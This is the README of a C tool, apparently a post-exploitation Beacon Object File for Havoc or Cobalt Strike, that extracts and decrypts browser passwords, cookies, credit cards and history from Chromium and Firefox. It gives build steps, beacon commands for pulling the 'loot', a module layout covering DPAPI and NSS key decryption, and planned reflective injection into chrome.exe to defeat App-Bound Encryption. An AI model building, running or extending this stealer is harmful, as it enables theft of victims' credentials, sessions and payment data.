# browserdata-bof

Standalone C port of [HackBrowserData](https://github.com/moonD4rk/HackBrowserData)
(Go, ~10k LOC) rebuilt as a **Beacon Object File** first, with the same engine
also linkable as a **standalone exe**. Windows x64/x86.

## What it extracts

| Category | Chromium (Chrome/Edge/Brave/Opera/Vivaldi/…) | Firefox |
|---|---|---|
| passwords | `Login Data` (+ `Login Data For Account`), v10/DPAPI decrypt | `logins.json` via `key4.db` NSS master key (ASN.1 PBE) |
| cookies | `Network/Cookies`, v10 decrypt + Chrome-130 SHA256(host) prefix strip | `cookies.sqlite` |
| history | `History` → `urls` | `places.sqlite` → `moz_places` |
| downloads | `History` → `downloads` | phase 2 (moz_annos schema varies) |
| credit cards | `Web Data` → `credit_cards` | n/a |
| bookmarks | `Bookmarks` JSON tree walk | `places.sqlite` → `moz_bookmarks` |

Supported Chromium forks (from `browser/consts.go`): chrome, edge, chromium,
chrome-beta, opera, opera-gx, vought, vivaldi, coccoc, brave, yandex, 360x, 360,
qq, dc, sogou, arc (wildcard path), duckduckgo (wildcard path).

## Build (Linux cross-compile, mingw)

```
make            # bof x64/x86 + exe x64/x86
make bof        # dist/browserdata.x64.o
make exe        # dist/hbd.exe
make clean
```

## BOF usage (Havoc `coffloader` / CS-compatible)

```
browserdata <browser|all> <categories|all> <json|csv> <verbose 0|1>

# everything, JSON, files only
browserdata all all json 0
# chrome passwords + cookies, stream loot inline
browserdata chrome passwords,cookies json 1
# edge history as CSV
browserdata edge history csv 1
```

Loot is written to `%TEMP%\hbd\` (one JSON/CSV file per browser/profile/category)
— pull with `download`. `verbose=1` streams the full file contents back over the
beacon in chunks.

Standalone: `hbd.exe -b all -c all -f json -o C:\loot [-v] [-q]`

## Architecture

```
common/beacon.h        COFF BOF API (CS-compatible; Havoc implements same)
core/bd.h              shared engine API
core/bd_util.c         sb, strings, UTC time (civil-from-days), no CRT i/o
core/bd_crypto.c       SHA1/256, HMAC, PBKDF2, BCrypt AES-GCM/CBC/3DES-CBC,
                       DPAPI, base64, v10/v20 blob dispatch, cookie-hash strip
core/bd_asn1.c         minimal DER + NSS PBE (privateKeyPBE/passwordCheckPBE/
                       credentialPBE) — mirrors crypto/asn1pbe.go
core/bd_json.c         tiny JSON parser (Local State, Bookmarks, logins.json)
core/bd_sqlite.c       staging-copy + query wrapper over vendored amalgamation
core/bd_fs.c           %TEMP% staging, locked-DB copy w/ retry, single-glob
core/bd_browsers.c     browser registry (consts.go), profile discovery,
                       Local State v10 key unwrap
core/bd_chromium.c     chromium extractors (passwords/cookies/history/
                       downloads/creditcards/bookmarks)
core/bd_firefox.c      key4.db master key, logins.json, cookies, places
core/bd_run.c          orchestration + category-mask parsing
bof/entry.c            go() — beacon entry
standalone/entry.c     main() — same engine
vendor/sqlite3.c       SQLite amalgamation (compile-time trimmed)
```

Design notes (BOF constraints):
- pure C99, `-fno-exceptions -fno-stack-protector`, no static CRT init, no
  large stack frames; CRT functions declared extern and resolved from
  `msvcrt` by the COFF loader (standard practice in public BOFs)
- crypto via `bcrypt.dll` resolved at runtime, DPAPI via `crypt32.dll`
- single relocatable object (`ld -r`) so all core + sqlite ship in one BOF

## Phase 2 roadmap (not yet ported)

- **v20 App-Bound Encryption (Chrome 127+)**: the Go project decrypts
  `app_bound_encrypted_key` by spawn-suspended + reflective-inject of
  `crypto/windows/abe_native/abe_extractor.c` into the browser process, which
  calls the vendor's `IElevator` COM service from inside chrome.exe. The
  injector (`utils/injector/reflective_windows.go`, manual PE mapping) and the
  native payload (already C!) need porting; `v20` blobs are reported as
  unavailable until then. The v20 *decrypt* path (AES-GCM) is already live.
- Yandex passman special-cases (`Ya Passman Data`, per-row AAD)
- LevelDB `Local Storage` / `Session Storage`, extensions (`Secure Preferences`)
- Firefox downloads (`moz_annos`), Safari/darwin/linux tiers
- VSS-based locked-file bypass (rfcs/009)
